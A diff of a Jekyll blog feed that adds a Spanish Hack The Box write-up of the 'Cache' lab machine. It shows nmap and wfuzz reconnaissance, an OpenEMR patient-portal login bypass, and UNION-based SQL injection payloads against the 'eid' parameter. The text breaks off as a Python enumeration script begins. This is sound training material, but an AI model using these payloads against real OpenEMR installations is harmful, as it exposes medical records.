@@ -1,4 +1,701 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-28T13:40:36-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Bank</title><link href="http://localhost:4000/htb-bank/" rel="alternate" type="text/html" title="Hack The Box Bank" /><published>2022-02-28T00:00:00-06:00</published><updated>2022-02-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-bank</id><content type="html" xml:base="http://localhost:4000/htb-bank/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/banner-bank.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-12T21:39:46-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Cache</title><link href="http://localhost:4000/htb-cache/" rel="alternate" type="text/html" title="Hack The Box Cache" /><published>2022-03-12T00:00:00-06:00</published><updated>2022-03-12T00:00:00-06:00</updated><id>http://localhost:4000/htb-cache</id><content type="html" xml:base="http://localhost:4000/htb-cache/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/banner-cache.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cache&quot;&gt;Cache&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.188.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.188
+PING 10.10.10.188 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.188&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.188: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;132 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.188 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 132.404/132.404/132.404/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.188 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-28 13:56 CST
+Initiating Ping Scan at 13:56
+Scanning 10.10.10.188 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 13:56, 0.15s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 13:56
+Scanning 10.10.10.188 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.188
+Discovered open port 22/tcp on 10.10.10.188
+Completed SYN Stealth Scan at 13:56, 35.69s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.188
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;36.00 seconds
+           Raw packets sent: 68299 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.005MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68296 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.732MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 117 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.188
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.188 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-28 13:58 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.188
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Cache
+|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;11.60 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el puerto 80 abierto, por lo tanto, antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.188/
+http://10.10.10.188/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.188], Script, Title[Cache]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, así que ahora si veamos el contenido con nuestro navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aquí el sitio ya nos da una pista, ya que el texto en &lt;strong&gt;&lt;em&gt;marquee&lt;/em&gt;&lt;/strong&gt; nos hace la referencia a &lt;strong&gt;&lt;em&gt;Virtual hosting&lt;/em&gt;&lt;/strong&gt;; por lo tanto, en nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; agregamos dicho dominio y probamos a ver el contenido nuevamente. Para este caso no vemos nada interesante, así que investigando un poco el sitio web, en la parte de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;author.html&lt;/code&gt;, tenemos lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos indica que existen otros proyectos como el &lt;strong&gt;HMS (Hospital Management System)&lt;/strong&gt;; por lo que podríamos probar a meter el dominio &lt;strong&gt;hms.htb&lt;/strong&gt; a nuestro archivo host y ver que pasa si accedemos a este.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hemos ingresado al panel de login de &lt;strong&gt;OpenEMR&lt;/strong&gt; y si buscamos credenciales default tenemos &lt;strong&gt;admin:pass&lt;/strong&gt;; sin embargo no jalan. Así que vamos a pensar que necesitamos encontrar credenciales válidas de acceso antes de tirar por otro lado; así que vamos a hacer &lt;strong&gt;&lt;em&gt;fuzzing&lt;/em&gt;&lt;/strong&gt; del dominio principal para empezar &lt;strong&gt;cache.htb&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;973 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://cache.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://cache.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000001073:   301        9 L      28 W       311 Ch      &quot;javascript&quot;                                                    
+000065593:   301        9 L      28 W       307 Ch      &quot;jquery&quot;                                                        
+000095524:   403        9 L      28 W       274 Ch      &quot;server-status&quot;                                                 
+
+Total time: 299.9204
+Processed Requests: 220560
+Filtered Requests: 220557
+Requests/sec.: 735.3950
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Validando los recursos vía web, obsevamos una credenciales &lt;strong&gt;ash:H@v3_fun&lt;/strong&gt; y como siempre vamos a guardarlas para no olvidarlas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si recordamos, el sitio web tiene un panel de login, por lo que podríamos probar a ver si tenemos suerte.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podriamos pensar en esteganografía, pero no hay nada; sin embargo, vamos a mantener las credenciales por si el usuario existe a nivel de sistema.&lt;/p&gt;
+
+&lt;p&gt;Buscando vulnerabilidades para &lt;strong&gt;OpenEMR&lt;/strong&gt;, nos encontramos con el recurso &lt;a href=&quot;https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf&quot;&gt;open-emr&lt;/a&gt;, en especial con la parte &lt;strong&gt;2.0 - Patient Portal Authentication Bypass&lt;/strong&gt;, en donde nos dice que debe de existir un &lt;strong&gt;Patient Portal Login&lt;/strong&gt;; por lo tanto, vamos a realizar un &lt;strong&gt;&lt;em&gt;fuzzing&lt;/em&gt;&lt;/strong&gt; para tratar de descubrir el directorio.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; hms.htb
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-12 18:29 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hms.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.188&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+rDNS record &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.188: cache.htb
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /admin.php: Possible admin folder
+|   /common/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /config/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /custom/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /images/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /library/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /modules/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /portal/: Potentially interesting folder
+|   /public/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /services/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /sites/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /sql/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /templates/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /tests/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|_  /vendor/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.17 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aquí el que ya nos debería llamar la atención sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/portal/&lt;/code&gt;, por lo tanto, vamos a hacer otra vez &lt;strong&gt;&lt;em&gt;fuzzing&lt;/em&gt;&lt;/strong&gt; sobre este recurso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; http-enum.basepath&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;portal/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; hms.htb
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-12 18:35 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hms.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.188&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+rDNS record &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.188: cache.htb
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /portal/account/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /portal/images/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /portal/lib/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|   /portal/messaging/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+|_  /portal/report/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.29 (ubuntu)'&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.41 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Uno recurso que ya nos llama la atención sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/portal/account/&lt;/code&gt;. Vamos a validar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De acuerdo con lo que nos indica el documento, podríamos acceder a los recursos que nos indica, como por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add_edit_event_user.php&lt;/code&gt; bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/portal/&lt;/code&gt;; así que vamos a checar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos aplica un &lt;strong&gt;&lt;em&gt;redirect&lt;/em&gt;&lt;/strong&gt; hacia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/index.php?site=&amp;amp;w&lt;/code&gt;. Con base al documento, nos dice que para hacer un bypass de este panel de login/registro, tenemos que ir a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/portal/account/&lt;/code&gt; y seleccionar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;register.php&lt;/code&gt;, posteriormente tratar de visualizar otro recurso de los que nos indica y conseguimos que no nos aplique un &lt;strong&gt;&lt;em&gt;redirect&lt;/em&gt;&lt;/strong&gt; hacia el panel de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos acceder a recursos para los cuales necesitaríamos habernos logueado pero sin la necesidad de hacerlo. Continuando leyendo el documento, nos indica que podemos realizar inyecciones SQL para el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add_edit_event_user.php&lt;/code&gt; debido a una inadecuada configuración del parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eid&lt;/code&gt;; por lo tanto, vamos a probar lo siguiente:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 order by 100-- -&lt;/code&gt; Nos manda un error de la base de datos, esto es porque no existen 100 columnas.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 order by 4-- -&lt;/code&gt; Vemos otra respuesta de acuerdo con la anterior, por lo tanto, podríamos suponer que se tienen 4 columnas.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select 1,2,3,4-- -&lt;/code&gt; No vemos los campos 1,2,3 y 4; por lo que vamos a tratar de adivinar en que posiciión podríamos observar algo. Si seguimos probando, no vemos nada.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,database(),null-- -&lt;/code&gt; Reemplazamos los números por el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; y vemos que en el campo 3 tenemos resultados y el nombre de la base de datos actualmente en uso es &lt;strong&gt;openemr&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select table_name from information_schema.tables where table_schema=&quot;openemr&quot; limit 0,1),null-- -&lt;/code&gt; Empezamos a listar los nombre de las tablas dentro de la base de datos &lt;strong&gt;openemr&lt;/strong&gt; y nos desplazamos por ellas con los valores de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit&lt;/code&gt;. Para no llevarnos una eternidad enumerando las tablas, vamos a crearnos un script en python que nos ayude a visualizar las tablas.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#coding:utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
